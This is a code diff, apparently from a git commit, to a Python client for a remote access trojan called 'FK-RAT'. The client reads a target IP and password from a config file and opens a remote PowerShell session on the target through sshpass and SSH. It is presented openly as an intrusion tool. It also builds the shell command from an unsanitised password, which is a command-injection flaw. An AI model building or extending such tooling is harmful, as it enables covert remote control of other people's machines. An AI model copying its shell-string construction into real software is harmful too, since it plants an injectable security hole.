@@ -3,15 +3,14 @@
 # created by: Sunnickel
 # inspired by: COSMO
 
-# import
+import getpass
 import os
 import sys
-import getpass
+
 from paramiko import SSHClient
-from modules import *
 
 ## variables
-banner ="""
+banner = """
  ▄▀▀▀█▄    ▄▀▀█▀▄    ▄▀▀▄ ▀▄  ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄      ▄▀▀▄ █  ▄▀▀█▄▄▄▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄ 
 █  ▄▀  ▀▄ █   █  █  █  █ █ █ █ ▄▀   █ ▐  ▄▀   ▐ █   █   █ █ █   ▐     █  █ ▄▀ ▐  ▄▀   ▐ ▐  ▄▀   ▐ █   █   █ ▐  ▄▀   ▐ █   █   █ █ █   ▐ 
 ▐ █▄▄▄▄   ▐   █  ▐  ▐  █  ▀█ ▐ █    █   █▄▄▄▄▄  ▐  █▀▀█▀     ▀▄       ▐  █▀▄    █▄▄▄▄▄    █▄▄▄▄▄  ▐  █▀▀▀▀    █▄▄▄▄▄  ▐  █▀▀█▀     ▀▄   
@@ -46,6 +45,7 @@ option_menu = """
 username = getpass.getuser()
 header = f"{username}@FK-RAT $ "
 
+
 # read config file
 def read_config(config_file):
     configuration = {}
@@ -55,23 +55,24 @@ def read_config(config_file):
 
     # get target information
     configuration["IPADDRESS"] = read_lines[0].strip()
-    configuration["PASSWORD"] = read_lines[1].strip()
-    configuration["WORKINGDIR"] = read_lines[2].strip()
+    configuration["PASSWORD"] = read_lines[2].strip()
+    configuration["WORKINGDIR"] = read_lines[4].strip()
 
     # return config
     return configuration
 
+
 # connects RAT to target
-def connect():
+def connect(address, password):
     config = read_config(sys.argv[1])
     ipv4 = config.get("IPADDRESS")
-    traget_password = config.get("PASSWORD")
+    target_password = config.get("PASSWORD")
     working_directory = config.get("WORKINGDIR")
 
     # remote connect
     target = SSHClient()
 
-    os.system(f"sshpass -p \"{traget_password}\" ssh fkrat@{ipv4}")
+    os.system(f"sshpass -p \"{target_password}\" ssh fkrat@{ipv4} 'powershell'")
 
 
 # command line interface
@@ -81,10 +82,19 @@ def cli(arguments):
         print(option_menu)
         option = input(header)
 
-        if option == "0":
-            connect()
+        try:
+            config = read_config(sys.argv[1])
+        except FileNotFoundError:
+            print("[!!] File does no exist")
+            exit()
+        ipv4 = config.get("IPADDRESS")
+        target_password = config.get("PASSWORD")
+
+        if option == "0":  # SSH Connection to target
+            connect(ipv4, target_password)
     else:
         print(help_menu)
+
 
 # detects what os is used
 def os_detection():
@@ -94,6 +104,7 @@ def os_detection():
     # linux
     if os.name == "posix":
         return "l"
+
 
 # main code
 def main():
@@ -106,6 +117,7 @@ def main():
         arguments_exist = True
 
     cli(arguments_exist)
+
 
 # run main code
 if __name__ == "__main__":
